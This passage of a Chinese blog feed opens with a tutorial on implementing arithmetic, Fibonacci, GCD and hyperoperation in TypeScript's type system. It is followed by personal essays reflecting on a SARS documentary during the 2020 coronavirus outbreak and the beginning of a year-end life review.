<code>@types/ramda</code> 中对于 <code>pipe</code> 等函数的类型标注），因为需要提高效率；</li><li>本文的代码实现均只停留在实验室阶段，不考虑可能的性能问题。</li></ol><h1>从函数式编程说起</h1><p>函数式编程有以下几个特点：</p><ul><li>描述映射：函数式编程并非描述解决问题的步骤，而是描述输入与输出的某种映射关系；</li><li>不可变量：函数式编程中没有所谓的“变量赋值”，只有“参数绑定”，一旦某个参数绑定了一个值，则不能被重新绑定；</li><li>无副作用：函数的输出只依赖于输入的参数，入参相同则返回值一定相同，函数运行过程中也不会对外界产生任何影响。</li><li>惰性求值：只有真正用到的值才需要被计算；</li><li>函数是一等公民：函数可以（甚至经常）作为另一个函数的参数和返回值，if 等语句也是函数；</li></ul><p>例如下面的代码：</p><pre><code class="lang-javascript">/**
 * 简单的斐波那契数列
 */
function fibonacci(n) {
    return n &lt;= 1 ? 1 : fibonacci(n - 1) + fibonacci(n - 2);
}
/**
 * 简单的欧几里得算法
 */
function gcd(x, y) {
    return y === 0 ? x : gcd(y, x % y);
}
/**
 * 超运算函数
 * https://en.wikipedia.org/wiki/Hyperoperation
 * n = 0: b+1（后继）
 * n = 1: a+b（加法，即 b 次 a 的后继）
 * n = 2: a*b（乘法，即 b 个 a 相加）
 * n = 3: a^b（乘方，即 b 个 a 相乘）
 * n = 4: a^a^a^...^a（超幂，即 b 个 a 不断乘方）
 *        \_________/
 *          b 个 a
 * n = …………
 */
function hyperoperation(n, a, b) {
    return n === 0
        ? b + 1
        : n === 1 &amp;&amp; b === 0
            ? a
            : n === 2 &amp;&amp; b === 0
                ? b
                : n &gt; 2 &amp;&amp; b === 0
                    ? 1
                    : hyperoperation(n - 1, a, hyperoperation(n, a, b - 1));
}</code></pre><p>由于函数式编程经常出现递归，专门的语言（Haskell 等）会将尾递归转换为循环，以提升运行效率；此外由于函数式编程有“无副作用”的特性，也可以使用记忆化等方式避免重复计算。</p><h1>TypeScript 泛型的例子</h1><p>在 TypeScript 中，我们偶尔会用到泛型，比如下面的冷饭（你猜对了，这些都出自本文的第一个链接）：</p><pre><code class="lang-typescript">type InstanceType&lt;T&gt; =
    T extends ConstructorType&lt;infer R&gt;
        ? R
        : T;
type RemovePropOptions&lt;T&gt; =
    NonNullable&lt;
        T extends PropOptions&lt;infer R&gt;
            ? R
            : null
    &gt;;
type OneOfTypePropOptions&lt;T&gt; =
    T extends ArrayType
        ? RemovePropOptions&lt;ValueOf&lt;T&gt;&gt;
        : T;
type ShapePropOptions&lt;T&gt; =
    T extends ShapeType
        ? { [K in keyof T]: RemovePropOptions&lt;T[K]&gt; }
        : T;</code></pre><p>乍看上去，TypeScript 的泛型长得很像函数：定义泛型相当于定义一个函数，其中的 <code>T</code>、<code>R</code> 等类型变量可以被看作参数。但通过不断尝试外加查资料，我们最终都会意识到：在 TypeScript 的泛型定义中是无法自由的定义变量并赋值的，这意味着它跟我们日常写的函数还有一些区别。</p><p>然鹅大家是否觉得这种写法跟函数式编程有点眼熟？有没有可能用 TypeScript 类型系统来重写上面的函数式编程代码呢？</p><p>不管有没有意义，我们先试着用易于理解、但是错误的语法写一下（为了避免高亮出现混乱，这段代码就不加高亮了）：</p><pre><code class="lang-text">type Fibonacci&lt;N&gt; =
    N &lt;= 1 ? 1 : Fibonacci&lt;N - 1&gt; + Fibonacci&lt;N - 2&gt;;
type Gcd&lt;X, Y&gt; =
    Y = 0 ? X : Gcd&lt;Y, X % Y&gt;;
type Hyperoperation&lt;N, A, B&gt; =
    N = 0
        ? B + 1
        : N = 1 &amp; B = 0
          ? A
          : N = 2 &amp; B = 0
            ? B
            : N &gt; 2 &amp; B = 0
                ? 1
                : Hyperoperation&lt;N - 1, A, Hyperoperation&lt;N, A, B - 1&gt;&gt;;</code></pre><h1>从零开始的造轮子生活</h1><p>Emmm……虽然看起来挺容易理解的，但这毕竟完全不是 TypeScript……为了用真正的 TypeScript 来编写这段代码，我们来看看究竟需要哪些轮子（工具类型）。</p><h2>定义“类型”</h2><p>首先，为了能让 TypeScript 允许我们对泛型参数做一些操作（例如取长度），我们需要先定义一些类型。在这里我们抛开 JavaScript 的一切知识，因为在 TypeScript 类型系统的世界中，我们目前一无所有——这意味着我们要从最基础的开始定义：</p><pre><code class="lang-typescript">// 用字符串来代替逻辑值
type Bool = 'true' | 'false';
// 用数组的长度作为数字的大小
type Int = any[];
// 第一个数字
type _0 = [];</code></pre><h2>简单的代数系统</h2><p>除了“类型”以外，映入眼帘的就是 <code>&lt;=</code>、<code>+</code>、<code>-</code> 等符号。我们需要先实现一个简单的代数系统。为了简单起见，我们假设所有的数字都是非负整数。</p><p>首先从“后继”运算开始，期望的效果如下：</p><pre><code class="lang-typescript">type Next&lt;I extends Int&gt; = Prepend&lt;any, I&gt;;

type _1 = Next&lt;_0&gt;; // [any]
type _2 = Next&lt;_1&gt;; // [any, any]
type _3 = Next&lt;_2&gt;; // [any, any, any]</code></pre><p>这里的 <code>Prepend</code> 该如何实现呢？有一个很 Tricky 的方法，我们构造一个函数，它的参数类型是 <code>any</code> + <code>any[]</code>，然后通过 <code>extends</code> 和 <code>infer</code> 将真正的参数类型提取出来：</p><pre><code class="lang-typescript">type Prepend&lt;E, T extends Int&gt; =
    ((e: E, ...list: T) =&gt; any) extends ((...list: infer R) =&gt; any)
      ? R : T;</code></pre><p>同理，我们需要一个 <code>Prev</code> 函数，它是 <code>Next</code> 函数的逆运算，我们可以用函数式编程中常用的 <code>Tail</code> 来实现：</p><pre><code class="lang-typescript">type Tail&lt;T extends Int&gt; =
    ((...t: T) =&gt; any) extends ((_: any, ...tail: infer R) =&gt; any)
    ? R : [];

type Prev&lt;I extends Int&gt; = Tail&lt;I&gt;;
type __2 = Prev&lt;_3&gt;; // [any, any]</code></pre><p>加法就是不断地调用 <code>Next</code>：</p><pre><code class="lang-typescript">type Add&lt;A extends Int, B extends Int&gt; =
    B extends _0 ? A : Add&lt;Next&lt;A&gt;, Prev&lt;B&gt;&gt;;
//                     ^^^^^^^^^^^^^^^^^^^^^</code></pre><p>然而如果这样写，TypeScript 在推导时会无法确定 <code>Add</code> 究竟是个什么类型（报错 <code>ts(2456)</code>，因为它在每一层都无法得到一个确定的结果），所以需要一点变通。下面一种写法可以让 TypeScript 在递归的每一层都有一个确定的结果：</p><pre><code class="lang-typescript">type Add&lt;A extends Int, B extends Int&gt; = {
    'true': A
    'false': Add&lt;Next&lt;A&gt;, Prev&lt;B&gt;&gt;
}[B extends _0 ? 'true' : 'false'];

type _4 = Add&lt;_1, _3&gt;; // [any, any, any, any]
type _5 = Add&lt;_2, _3&gt;; // [any, any, any, any, any]</code></pre><blockquote><p>注意：TypeScript 在递归超过 50 层之后，会强行推导为 <code>any</code>，所以实际上来讲，我们目前的代码无法处理 50 以上的加法。</p></blockquote><p>当然，其中的 <code>B extends _0 ? 'true' : 'false'</code> 可以抽成一个工具函数：</p><pre><code class="lang-typescript">type Eq&lt;A extends Int, B extends Int&gt; = A extends B ? 'true' : 'false';

type Add&lt;A extends Int, B extends Int&gt; = {
    'true': A
    'false': Add&lt;Next&lt;A&gt;, Prev&lt;B&gt;&gt;
}[Eq&lt;B, _0&gt;];</code></pre><p>减法也可以通过类似的方式写出来：</p><pre><code class="lang-typescript">type Sub&lt;A extends Int, B extends Int&gt; = {
    'true': A
    'false': Sub&lt;Prev&lt;A&gt;, Prev&lt;B&gt;&gt;
}[Eq&lt;B, _0&gt;];

type __3 = Sub&lt;_5, _2&gt;; // [any, any, any]</code></pre><p>乘法我们需要写一个辅助函数，因为我们要保存一个累加器：</p><pre><code class="lang-typescript">type _Mul&lt;Counter extends Int, A extends Int, B extends Int&gt; = {
    'true': Counter
    'false': _Mul&lt;Add&lt;Counter, A&gt;, A, Prev&lt;B&gt;&gt;
//           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
}[Eq&lt;B, _0&gt;];

type Mul&lt;A extends Int, B extends Int&gt; = _Mul&lt;_0, A, B&gt;;</code></pre><p>看似很简单的东西，但是 TypeScript 会报 <code>ts(2589)</code>，因为它认为这样可能会递归非常深，所以直接拒绝推导。这里可以用 <code>infer</code> 将未来需要的运算提前一些：</p><pre><code class="lang-typescript">type _Mul&lt;Counter extends Int, A extends Int, B extends Int&gt; = {
    'true': Counter
    'false': Add&lt;Counter, A&gt; extends infer R ? _Mul&lt;R, A, Prev&lt;B&gt;&gt; : never
//                                                  ^
}[Eq&lt;B, _0&gt;];</code></pre><p>报错变成了 <code>ts(2344)</code>，说 <code>R</code> 不是一个 <code>Int</code>。因为 TypeScript 的 <code>infer</code> 是无法预先知道结果的，但我们知道它一定是个 <code>Int</code>，因此再写一个转换函数 <code>Cast</code>，相当于强制类型转换（事实上根本没转）：</p><pre><code class="lang-typescript">type Cast&lt;X, Y&gt; = X extends Y ? X : Y;

type _Mul&lt;Counter extends Int, A extends Int, B extends Int&gt; = {
    'true': Counter
    'false': Add&lt;Counter, A&gt; extends infer R ? _Mul&lt;Cast&lt;R, Int&gt;, A, Prev&lt;B&gt;&gt; : never
}[Eq&lt;B, _0&gt;];

type _6 = Mul&lt;_2, _3&gt;; // [any, any, any, any, any, any]</code></pre><p>整除和取模通过目前已有的工具函数已经可以写出来了，原理是循环相减，有兴趣的同学可以自行实践一下，开头就用 <code>Div&lt;A extends Int, B extends Int&gt;</code> 和 <code>Mod&lt;A extends Int, B extends Int&gt;</code> 吧。</p><p>然后是一些针对布尔值的逻辑运算 <code>And</code>、<code>Or</code>、<code>Not</code>：</p><pre><code class="lang-typescript">type And&lt;A extends Bool, B extends Bool&gt; =
    A extends 'false' ? 'false' : B extends 'false' ? 'false' : 'true';

type _and_true_true = And&lt;'true', 'true'&gt;;     // 'true'
type _and_true_false = And&lt;'true', 'false'&gt;;   // 'false'
type _and_false_true = And&lt;'false', 'true'&gt;;   // 'false'
type _and_false_false = And&lt;'false', 'false'&gt;; // 'false'

type Or&lt;A extends Bool, B extends Bool&gt; =
    A extends 'true' ? 'true' : B extends 'true' ? 'true' : 'false';

type _or_true_true = Or&lt;'true', 'true'&gt;;     // 'true'
type _or_true_false = Or&lt;'true', 'false'&gt;;   // 'true'
type _or_false_true = Or&lt;'false', 'true'&gt;;   // 'true'
type _or_false_false = Or&lt;'false', 'false'&gt;; // 'false'

type Not&lt;A extends Bool&gt; = A extends 'true' ? 'false' : 'true';

type _not_true = Not&lt;'true'&gt;;   // 'false'
type _not_false = Not&lt;'false'&gt;; // 'true'</code></pre><p>最后是比较运算符，我们先从小于号开始，首先判断 <code>A</code> 是否是 <code>0</code>，然后 <code>B</code> 是否是 <code>0</code>，最后是一个递归。这是一个三叉路口，但对于 TypeScript 来说不在话下：</p><pre><code class="lang-typescript">type Lt&lt;A extends Int, B extends Int&gt; = {
    'A = 0': Not&lt;Eq&lt;B, _0&gt;&gt;
    'B = 0': 'false'
    'other': Lt&lt;Prev&lt;A&gt;, Prev&lt;B&gt;&gt;
}[
    A extends _0
        ? 'A = 0'
        : B extends _0
            ? 'B = 0'
            : 'other'
];

type _lt_1_2 = Lt&lt;_1, _2&gt;; // 'true'
type _lt_5_3 = Lt&lt;_5, _3&gt;; // 'false'
type _lt_4_4 = Lt&lt;_4, _4&gt;; // 'false'</code></pre><p>其它的符号，其实可以通过 <code>Lt</code>、<code>Eq</code> 配合 <code>And</code>、<code>Or</code>、<code>Not</code> 来实现：</p><pre><code class="lang-typescript">type Lte&lt;A extends Int, B extends Int&gt; =
    // 使用 `extends` 和 `infer` 来提前计算 a&lt;b
    Lt&lt;A, B&gt; extends infer R
        ? Or&lt;Cast&lt;R, Bool&gt;, Eq&lt;A, B&gt;&gt;
        : never;
type Gt&lt;A extends Int, B extends Int&gt; = Not&lt;Lte&lt;A, B&gt;&gt;;
type Gte&lt;A extends Int, B extends Int&gt; = Or&lt;Gt&lt;A, B&gt;, Eq&lt;A, B&gt;&gt;;</code></pre><h1>一个比较完美的实现</h1><p>有了之前的积累，上面的几个函数就比较好写了：</p><pre><code class="lang-typescript">type Fibonacci&lt;N extends Int&gt; = {
    'true': _1
    // 使用 `extends` 和 `infer` 来提前计算 f[n-1] 和 f[n-2]
    'false': Fibonacci&lt;Sub&lt;N, _1&gt;&gt; extends infer F_N_1
        ? Fibonacci&lt;Sub&lt;N, _2&gt;&gt; extends infer F_N_2
            ? Add&lt;Cast&lt;F_N_1, Int&gt;, Cast&lt;F_N_2, Int&gt;&gt;
            : never
        : never
}[Lte&lt;N, _2&gt;];

type _fibonacci_1 = Fibonacci&lt;_1&gt;; // [any]
type _fibonacci_2 = Fibonacci&lt;_2&gt;; // [any]
type _fibonacci_3 = Fibonacci&lt;_3&gt;; // [any, any]
type _fibonacci_4 = Fibonacci&lt;_4&gt;; // [any, any, any]
type _fibonacci_5 = Fibonacci&lt;_5&gt;; // [any, any, any, any, any]
type _fibonacci_6 = Fibonacci&lt;_6&gt;; // [any, any, any, any, any, any, any, any]

type Gcd&lt;X extends Int, Y extends Int&gt; = {
    'true': X
    'false': Gcd&lt;Y, Mod&lt;X, Y&gt;&gt;
}[Eq&lt;Y, _0&gt;]

type H&lt;N extends Int, A extends Int, B extends Int&gt; = {
    'N = 0': Next&lt;B&gt;
    'N = 1 &amp; B = 0': A
    'N = 2 &amp; B = 0': _0
    'N &gt; 2 &amp; B = 0': _1
    // 使用 `extends` 和 `infer` 来提前计算 h(n, a, b-1)
    'other': H&lt;N, A, Prev&lt;B&gt;&gt; extends infer R ? H&lt;Prev&lt;N&gt;, A, Cast&lt;R, Int&gt;&gt; : never
}[
    Eq&lt;N, _0&gt; extends 'true'
        ? 'N = 0'
        : And&lt;Eq&lt;N, _1&gt;, Eq&lt;B, _0&gt;&gt; extends 'true'
            ? 'N = 1 &amp; B = 0'
            : And&lt;Eq&lt;N, _2&gt;, Eq&lt;B, _0&gt;&gt; extends 'true'
                ? 'N = 2 &amp; B = 0'
                : And&lt;Gt&lt;N, _2&gt;, Eq&lt;B, _0&gt;&gt; extends 'true'
                    ? 'N &gt; 2 &amp; B = 0'
                    : 'other'
]

type _h_0_0_3 = H&lt;_0, _0, _3&gt;; // 3+1=4,  [any, any, any, any]
type _h_1_5_6 = H&lt;_1, _5, _6&gt;; // 5+6=11, [any, any, any, any, any, any, any, any, any, any, any]
type _h_2_4_2 = H&lt;_2, _4, _2&gt;; // 4*2=8,  [any, any, any, any, any, any, any, any]
type _h_3_3_3 = H&lt;_3, _3, _3&gt;; // 3^3=27, [any, any, any, any, any, any, any, any, any, any, any, any, any, any, any, any, any, any, any, any, any, any, any, any, any, any, any]</code></pre><h1>无法实现的问题，以及未来的解决方案</h1><p>上面的例子看起来很完美、很符合逻辑，但毕竟 TypeScript 类型系统并不是为了函数式编程而服务的，因此也有一些思想是它暂时无法实现的。</p><blockquote><p>注意：只是思想无法实现。TypeScript 类型系统在理想状态下是图灵完备的。</p></blockquote><h2>惰性计算</h2><p>这其实是 TypeScript 目前的定位和设计所导致的。本文的“函数”只是 TypeScript 中普通的“工具类型”，并没有真正的“函数”的功能，所谓的“返回值”也只是跟这个定义的内容等价的“TypeScript 类型”而已。虽然每个工具类型本身写起来是函数式编程，但不同的工具类型却是按照命令式逐一定义并推导的。</p><h2>函数是一等公民</h2><p>考虑到这样一个函数，它的输入和输出都是函数：</p><pre><code class="lang-javascript">function compose(...f) {
    return f.length === 0
        ? undefined
        : f.length === 1
          ? f[0]
          : (...args) =&gt; f[0](compose(...f.slice(1))(args));
}</code></pre><p>如果用 TypeScript 类型系统来写，会是什么样的呢？</p><blockquote><p>注意：从这里开始，所有的 TypeScript 代码在本文发布的时期都是错误的，不要模仿。</p></blockquote><pre><code class="lang-typescript">type Compose&lt;F&gt; =
    F['length'] extends 0
        ? undefined
        : F['length'] extends 1
            ? F[0]
            : ########</code></pre><p>井号的部分写起来并没有那么直观。事实上，TypeScript 目前不支持高阶工具类型（Higher order types），因此我们没有办法把“函数”作为输入和输出。</p><h2>未来的解决方案</h2><p>目前 TypeScript 有这样一个 Proposal：<a href="https://github.com/microsoft/TypeScript/issues/1213#issuecomment-523245130">Higher Order, Lamda, Reference types</a>，目前的状态是 Backlog（待办）。它的语法有点类似于 C 里面的函数指针：</p><pre><code class="lang-typescript">type A&lt;T extends string&gt; = { 0: T }
type B&lt;T extends string&gt; = [T]
type C&lt;T extends number&gt; = 42

// Here's our lamda
type Referer&lt;*Ref&lt;X extends string&gt;, T extends string&gt; = Ref&lt;T&gt;

type testA = Referer&lt;A, 'hi'&gt; // { 0: 'hi' }
type testB = Referer&lt;B, 'hi'&gt; // ['hi']
type testC = Referer&lt;C, 'hi'&gt; // ERROR</code></pre><p>唯一需要做的就是在“参数”前面加一个星号，表示这个“参数”是一个泛型，这样我们就能将“函数”作为“参数”传进去了。如果用普通的代码来写，大概是这样：</p><pre><code class="lang-typescript">const a = (t: string) =&gt; ({ 0: t });
const b = (t: string) =&gt; [t];
const c = (t: number) =&gt; 42;

// Here's our lamda
const referer = (ref: (x: string) =&gt; any, t: string) =&gt; ref(t)

const testA = referer(a, 'hi') // { 0: 'hi' }
const testB = referer(b, 'hi') // ['hi']
const testC = referer(c, 'hi') // type mismatch</code></pre><p>先不管它以后会不会被实现，至少可以确定的是：如果有了这个功能，上面两个问题就都能解决了：第二个问题无需多讲；对于第一个问题，由于需要支持传入一个泛型，那么支持传入泛型的那个泛型（上文的 <code>Referer</code>）在传入之前是无法被推导的。作者也说了：In this context, we can say that <code>*</code> "protects" against immediate evalutation.</p><h2>做个脑力游戏吧</h2><p>假如真的有了这个功能，我们该怎么实现 <code>Compose</code> 呢？</p><pre><code class="lang-typescript">type Compose&lt;
    F extends Array&lt;*Ref&lt;T extends any&gt;&gt;
&gt; =
    F['length'] extends 0
        ? undefined
        : F['length'] extends 1
            ? F[0]
            : ########</code></pre><p>这个特性依旧无法让我们在井号的地方直接用 <code>type xxx = yyy</code> 这种方式来定义“函数”。</p><p>方法总比困难多，不是不能在定义中定义吗，我在之前先定义好不就可以了？我把井号部分抽成一个辅助函数 <code>P</code>：</p><pre><code class="lang-typescript">type P&lt;F extends Array&lt;*Ref&lt;T extends any&gt;&gt;&gt; = *(F[0])&lt;Compose&lt;Tail&lt;F&gt;&gt;&gt;;</code></pre><p>那么井号的部分就可以直接写 <code>*(P&lt;F&gt;)</code> 了！</p><p>然而这有个问题：<code>P</code> 要在 <code>Compose</code> 之前定义，但 <code>P</code> 里面又用到了 <code>Compose</code>。在函数式编程中有一个方法可以解决：我们可以将 <code>Compose</code> 作为参数传入 <code>P</code>，就像这样：</p><pre><code class="lang-typescript">type P&lt;
  *H&lt;*F extends Array&lt;*Ref&lt;T extends any&gt;&gt;&gt;,
  F extends Array&lt;*Ref&lt;T extends any&gt;&gt;
&gt; = *(F[0])&lt;H&lt;Tail&lt;F&gt;&gt;&gt;;</code></pre><pre><code class="lang-typescript">type Compose&lt;
    F extends Array&lt;*Ref&lt;T extends any&gt;&gt;
&gt; =
    F['length'] extends 0
        ? undefined
        : F['length'] extends 1
            ? F[0]             // is a generic
            : *(P&lt;Compose, F&gt;) // is also a generic</code></pre><p>更进一步，我们可能可以推出函数式编程中的 Y-组合子，从而从另一个方向上证明了它是图灵等价的。</p><h1>参考资料</h1><ul><li><a href="https://www.byvoid.com/zhs/blog/apio-fp">APIO讲稿——函数式编程 - BYVoid</a></li></ul>]]></content>
        <author>
            <name><![CDATA[R·ex / Zeng]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.suruifu.com/posts/389</id>
        <title><![CDATA[只关人性（观《非典十年祭》有感）]]></title>
        <updated>2020-02-02T11:02:37+08:00</updated>
        <link href="https://www.suruifu.com/posts/389"/>
        <content type="text/html" src="https://www.suruifu.com/posts/389"><![CDATA[<p><strong><em>本文作者小杉</em></strong></p>
<blockquote><p>
  在今年春节这个特殊时期，凤凰卫视重新推出了7年前的纪录片。
</p></blockquote>
<h3>一切都要基于人性</h3>
<p>7年前的人们认为信息透明度不够是导致非典在扩散之初没得到合理的关注和重视原因之一。在小小屏幕上的一条条短信，确实让我们感受遥远时代的陈旧感。如今，网速变快，信息透明度自然提高，早期的消息依然被守得密不透风，越自由反而越严密。为什么？这是一个相当自然的反映，就像没人愿意把所有的小缺点告诉他人一样。何时透露，何种方法透露，取决于对事情严重程度的判断。</p>
<p>在治疗过程中，出现了很多发人深思的小插曲。人们对于转院和去专门医院这类事情，有着强烈的抵触情绪。当一个人被送到小汤山时拒绝下车，因为害怕被送到集中营，这看起来有些可笑。然而传染病抑制方法三部曲之一是消除传染源，谁又能知道这个消除的真正含义是什么呢？当个人利益和社会利益不完全一致时，谁又不会产生这种恐惧？</p>
<h3>轻轻地来正如轻轻地去</h3>
<p>SARS的出现和消失就是这么突然，消失后多年其源头仍无从知晓，亦无特效药。好像存在本身就是用来提醒和嘲讽人类的渺小一般，然而对我们的提醒，是否真的被听到呢？纪录片的新闻上赫然写着H1N1流感在上海传播，到了今日人们才不断宣传勤洗手，戴口罩。让人不禁发问，虽然技术在进步，物质在丰富，可是人类真的进步了吗？</p>
<h3>后来的后来</h3>
<p>因病死去和一直活在阴影中，到底该如何取舍？虽说SARS没有特效药，医生只能兵来将挡水来土掩，激素的量真的是难以控制？无暇顾及？还是为了出院率和治愈率不惜一切代价呢？其中年轻小护士的故事让人心疼，对于一个小姑娘来说，健康和钱哪个价值更大呢？看着当年人们对未来的预测，“以后不会发生这样的事了”，是鼓舞信心的美好愿望还是凸显了预测的毫无价值呢？</p>
<h3>经济学视角</h3>
<p>这几天一直在阅读薛兆丰经济学讲义，我们之所以没有因非典而做出改变，是因为成本太高，价值太低。修建全国传染病预防系统或者是推行一套全国必须执行的健康安全标准似乎都有些不合适。此外，与上次不同，这次信息透明度增加和民众的关注度提高，人权、隐私问题、人身自由就被全面的侵犯了，不过一切以社会效益最大化的前提下，这并没有什么问题。在面对未知问题时，以最节约成本，最有效率的方法解决，让避免意外成本最低的一方来承担责任，的确是较好的办法。但是，如果不以社会效益最大化为目标又会是怎样的呢？这一点我还没想清楚。</p>
<h3>结语</h3>
<p>回望历史或者阅读经典，不是为了力挽狂澜或是避免灾祸，而是遇到时灾祸时，无论结果都能更坦然。</p>]]></content>
        <author>
            <name><![CDATA[苏瑞辅的个人网站]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.suruifu.com/posts/385</id>
        <title><![CDATA[控制传染病（观《非典十年祭》有感）]]></title>
        <updated>2020-02-01T07:15:17+08:00</updated>
        <link href="https://www.suruifu.com/posts/385"/>
        <content type="text/html" src="https://www.suruifu.com/posts/385"><![CDATA[<blockquote><p>
  如今全国上下都能与2019-ncov对抗，我观看了《非典十年祭》记录片，在此记录一下自己的感受。
</p></blockquote>
<p><img src="https://s.suruifu.com/www/2020/02/2019-ncov实况.png" alt="" /></p>
<p>“传染病”由“传染”和“病”两部分组成，我认为控制传染病也应该从两个角度来考虑。</p>
<h3>控制“传染”</h3>
<p>我们可以从一个实际的问题开始，如果你有一个打呼噜的室友，你该怎么办？想到的方法无非有三种。<br />
1. 防止呼噜声产生。将室友隔离、为室友治疗疾病、阻止室友夜晚睡觉；<br />
2. 阻碍呼噜声传播。将宿舍抽成真空使得声音没有传播媒介、在室内建造墙体阻碍声音传播等；<br />
3. 防止噪声进入人耳。戴上耳塞等。</p>
<p>当我们来到了传染病传播的问题上，也是相同的道理，对应着也有三种方法。<br />
1. 隔离传染源。加强监测、将确诊或疑似病人进行隔离治疗；<br />
2. 防止疾病传播。取消公共活动、对公共设施进行定期消毒等；<br />
3. 防止疾病进入人体。出门戴口罩、勤洗手等。</p>
<h3>控制“病”</h3>
<p>对于传染病，康复有两个途径。<br />
1. 依赖于自身免疫系统；<br />
2. 存在特效药物。<br />
当没有特效药的时候，就仅仅依赖于自身免疫系统了。其实我们自身免疫系统还是非常强大的，就是干起活来不认人，正如那句笑话所讲的，“我承认我有赌的成分，但是今天你和病毒必须死一个”。在免疫系统发功的时候，人体自身会有很多并发症，比如说发烧等。这个时候为了避免并免疫系统干死，就需要医疗手段的干预。换句话说，<strong>在没有特效药的情况下，现代医学是非常被动的</strong>。如果你扛不住免疫系统、病毒、医疗手段、并发症中任何一者的“毒性”，那就一命呜呼了，反之就是治好了。</p>
<h3>解铃还须系铃人</h3>
<p>理论上讲，如果能将所有病人隔离，这个传染病就得到控制了，但是往往政府的强大调用能力在天灾面前往往显得那么苍白无力。以非典为例，最终天气变热了，非典失去了适宜的生存环境，然后非典就消失了。</p>
<p>当年的非常在天气变热的时候，就不适宜了，这次2019-ncov是否也能如此呢？院士们讲的很快就会出现拐点是否会出现呢？2020年有了2003年难以想象的人口流动，是否意味着这一次将会更难度过呢？</p>
<p>让时间给我们答案吧。我们现在能做的也是做好自身防护，冷静应对，制定自身提升方案，争取在这次“萧条”之后能够正常启航。</p>]]></content>
        <author>
            <name><![CDATA[苏瑞辅的个人网站]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.suruifu.com/posts/381</id>
        <title><![CDATA[心态而不是真相（观《被光带走的人》有感）]]></title>
        <updated>2020-01-30T10:17:47+08:00</updated>
        <link href="https://www.suruifu.com/posts/381"/>
        <content type="text/html" src="https://www.suruifu.com/posts/381"><![CDATA[<p><strong><em>本文作者小杉</em></strong><br />
白光是什么？没有结论，也不需要结论。因为它是否存在结论已经不重要，重要的是人们如何理解它，如何面对它。</p>
<p>经历抗拒、恐慌、精神心态受到严重影响、回归新常态。重要的不是突发事件的发生而是如何对待事件和如何对待自己的内心。</p>]]></content>
        <author>
            <name><![CDATA[苏瑞辅的个人网站]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://yuwenjie.cc/2019-byeNhi.html</id>
        <title><![CDATA[越来越长的文章就像越来越长的人生一样难懂]]></title>
        <updated>2019-12-31T15:24:54+08:00</updated>
        <link href="https://yuwenjie.cc/2019-byeNhi.html"/>
        <content type="text/html" src="https://yuwenjie.cc/2019-byeNhi.html"><![CDATA[<p>一到 12.31 这一天，从上午白神的 rsa 红包开始，大家也都陆陆续续的放出了自己的年终保留节目 —— 大佬随意抛出几个数字，惹得众人一片可爱；小透明只能默默码出几行文字，也算是不辜负一整年早期图书馆的自己。</p><p>今年已经看了好几篇了，发现大家随着年纪的变大，渐渐地都变成了编年体按时间顺序去记忆，或许这和我很久很久没有接触到小朋友有关系吧，因为毕竟这么一大把年纪，996 之余还能记得起写总结的，已经越来越少了。</p><p>———— 写在前边</p><h2>话语权</h2><p>钱对于大学生来说 就意味着话语权</p><p>我永远也忘记不了，那些年那些天，早上七点起来看脚本运行情况的日子，或是七点钟被生物钟叫醒去提心吊胆的看运行日志的日子，忘不了上课还要在千牛回复消息的日子，忘不了和其他几家店的勾心斗角的日子。忘不了每天晚上十二点，和她看一眼营业额，满足而欣慰的样子。</p><p>虽然这成为了回忆中那段好景不长的日子，但是之后的很长一段时间里，我拥有了话语权。但是有话语权的这个人 没有认清自己，他过于刚愎自用，喜欢孤注一掷，不懂得分享，又很会嫉妒，好景不长就注定是好景不长了。</p><hr><p>这段故事的开头，是我前几天发烧的时候，半夜三点多的时候醒过来，身上疼的像刚跟人打过一架一样，抓了好几把抓到手机看时间的时候，叹了一口气在备忘录里写的。和在腾讯等班车的时候一样，只有在恰当的心境配合恰当的环境，才会用手机去写东西。</p><p>发烧和等班车是一样的，等在那里，心里憔悴而焦躁，永远不知道他啥时候来，啥时候再来；也不知道你打车能先到家，还是吃药更伤害自己。做出一个改变现状的选择，最大的阻力来自于对于未知的恐惧，也就是 “Nothing to fear but fear itself”。烦躁的时候，人会试图去倾诉，这个时候的倾诉如果付诸于文字，那么首先这段文字是负能量的，其次这段文字的辞藻是很贫乏的，因为句法的习惯说梦话都难以改变，饿肚子的时候谁还想着写个成语还是语法糖什么的。</p><p>所以说我后来的今天再看我这段开头，“好景不长就注定是好景不长了”，短短几句我想已经表达清楚了我当时的想法了，续写我是接不上去了。</p><p>无独有偶吧，也算是，今天我在其他人的总结里，看到钱的地方，只有鹤洋一处。钱对大学生究竟意味着什么呢？在我去年问陈老师的时候，他说实习的薪水可以满足购买欲，今年我问陈老师的时候，他说更多的钱才能满足购买欲。</p><p>大学里很有意思的事情就是看跳蚤市场的群，特别是一幅图，标一个价格，然后价格划掉再标一个，然后再划掉，改成0，然后下边加一个新东西，写上买这个送上边那个。购买欲被满足了之后，其实这是个蛮合理的释放“购买压”的渠道。</p><p>对于太多的学生来讲，如果没有钱，就意味着一段没法满足欲望的生活；并意味着可能将错失的机遇或者是爱情迁怒于此的借口。本来期待着今晚能消灭贫困，国家送一个女朋友到宿舍门口，哪想到讲话告诉你明年这时候才能送到。</p><p>四年过去了，过去的一年和之前的三年一样，大家都在为怎么在校内校外扣到钱而东北西走着，他们辛苦了，我也辛苦了。接下来的一段时间，我会更多地把钱花在看上而不是增加固定资产上，因为有些东西，996之前实现是需要钱的，996之后实现是需要时间的。</p><p>所以无非还是那个问题，时间与金钱的平衡。时间对于大多数人是慈祥而平等的，对他的额外的那一份爱之于宇宙尺度也不过是一洼池塘，但是财富却是极其不均衡的。</p><h2>中产阶级陷阱</h2><p>12月的中旬的时候，我去上海玩。之前数篇文章中也有说过，我不太喜欢去上海，因为有对比差异感和缺少融入感。这次去目的有仨，一是赵神刚刚入职美团，二是 pm 学叔刚刚乔迁上海，<del>三是我发现了公司有免费往返上海的大巴</del></p><p>所以不去白不去，抱着添添喜气的心态就去了。然后周六一天我就在欢乐谷玩了一天的过山车，啊比深圳那次还要爽，除了木质的那个检修之后，其余几个过山车加起来一共 15 趟，后来只是嗓子有感觉心跳没感觉了。（那一天的平均心跳拉高了好多</p><p><img src="https://cdn.jsdelivr.net/gh/seiry/img-outer@img//heartbeats.PNG" alt="心跳" 